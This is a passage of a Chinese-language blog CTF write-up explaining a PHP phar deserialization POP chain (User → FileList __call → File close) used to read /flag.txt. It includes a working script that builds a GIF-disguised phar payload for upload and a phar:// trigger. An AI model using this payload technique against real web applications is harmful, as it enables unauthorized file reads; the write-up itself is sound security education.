class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先从File类开始看起，我们知道 delete.php 和  upload.php 是利用了File类中的 close() delete() 函数来读取文件和删除文件的。我们要想读 .&#x2F;flag.txt文件，最终的落脚点肯定是在这个函数上面，看到FileList类里面有 call 函数， 很自然的联系到能不能使用 反序列化， 可是 unseralize( ) 函数的影子都没看到，怎么利用？</p>
+<p>这个时候就需要用到一个新的东西，phar协议和.phar文件，利用这个在没有unseralize()的情况下也可以进行反序列化</p>
+<p>详细介绍可以参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>
+<p>上面那篇文章已经描述的挺清楚了。</p>
+<p>现在想办法构造pop链</p>
+<p>call 函数 是在一个类调用一个不存在的函数而触发的,我们如果让User类的$db 变量 等于FileList类，那么User类在析构的时候，$this-&gt;db-&gt;close()  就会变成 FileList -&gt; close()从而触发call 函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __call($func, $args) &#123;</span><br><span class="line">       array_push($this-&gt;funcs, $func);</span><br><span class="line">       foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">           $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里把Filelist的 files数组 进行遍历，每个变量都调用一下 func,如果我们这里让 FileList类的 files 数组 等于 File类数组，不就可以调用 close()函数了吗？ 然后让File类的filename变量的值为 .&#x2F;flag.txt 就可以读到flag了。</p>
+<p>pop链就很清晰了：</p>
+<p>User类的destruct  -&gt; FileList类 -&gt; close() 触发 call 函数 ，然后 File类 调用close()函数 从而读到flag</p>
+<p>我们构造的 hack.php文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db=<span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">File</span>());</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;results=<span class="keyword">array</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;funcs=<span class="keyword">array</span>();</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;hack.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;hack.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问之后，本地生成 hack.phar文件，然后改成 hack.gif  上传 </p>
+<p>然后在用phar协议来读取，触发反序列化：</p>
+<p><img src="https://i.loli.net/2020/10/11/3d2lXLhsi67qtkf.png" alt="2.png"></p>
+<p>这里有个细节，我用的是delete.php执行的payload</p>
+<p>download.php中有一行代码：</p>
+<p><code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></p>
+<p>可以看出来 download.php对访问权限进行了限制，只能访问当前目录 以及 &#x2F;etc  和 &#x2F;tmp  ，download.php在 &#x2F;var&#x2F;www&#x2F;html下，所以当前目录是网站的根目录，即&#x2F;var&#x2F;www&#x2F;html&#x2F;，所以是只能访&#x2F;var&#x2F;www&#x2F;html下的所有内容（包括子目录）。而我们要读取的&#x2F;flag.txt 在系统的根目录，所以不能在download.php下读。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/10/11/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web2%5Dikun/" rel="prev" title="CISCN2019华北赛区Day1Web2]ikun">
+                  <i class="fa fa-angle-left"></i> CISCN2019华北赛区Day1Web2]ikun
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/10/11/SUCTF2019Pythonginx/" rel="next" title="SUCTF2019Pythonginx">
+                  SUCTF2019Pythonginx <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
